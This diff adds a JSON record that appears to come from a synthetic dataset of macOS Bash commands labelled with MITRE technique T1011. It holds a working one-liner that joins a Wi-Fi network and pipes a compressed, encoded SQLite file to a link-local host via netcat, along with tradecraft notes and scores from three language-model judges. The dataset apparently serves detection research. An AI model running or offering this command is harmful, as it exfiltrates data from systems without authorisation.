@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
+  "explanation": "Sends a compressed, base64-encoded SQLite file over a link-local IPv4 path after joining a lab Wi‑Fi SSID, ensuring the medium is the Wi‑Fi interface rather than the primary network. High, uncommon TCP port is used per T1011 tradecraft.",
+  "rationale_steps": [
+    "Disconnect from any existing Wi‑Fi.",
+    "Join a nonstandard lab SSID on 5 GHz.",
+    "Compress and base64-encode the database file.",
+    "Transmit to a link-local IPv4 peer on a high port to stay within the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-66ef1261",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with correct chaining via && and pipes, balanced quoting for SSID/password, and valid-looking macOS flags/paths.",
+        "semantic_score": 3,
+        "semantic_justification": "While it aligns with T1011 by joining Wi‑Fi and exfiltrating via nc to a link‑local IPv4, the use of sudo only for the first step means networksetup may fail without privileges and the path selection to ensure Wi‑Fi (169.254/16) is not guaranteed across interfaces, reducing operational reliability.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-09-30T22:59:32.453810Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for all tools (airport -z, networksetup -setairportnetwork, gzip -c, base64, nc with -w and -N), and correct use of && and | separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1011 by disassociating from the current Wi-Fi network, joining a specific SSID, then compressing and base64-encoding a SQLite audit file before exfiltrating it via netcat over a link-local address on a high non-standard port, all consistent with exfiltration over an alternate network medium on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2026-02-18T22:09:54.120387Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct shell operators, valid paths for macOS internal utilities, and balanced quoting for the SSID and password.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates Technique T1011 by explicitly switching the network medium to a specific Wi-Fi SSID before exfiltrating data via a standard pipeline of compression, encoding, and network transfer.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:09:58.879912Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
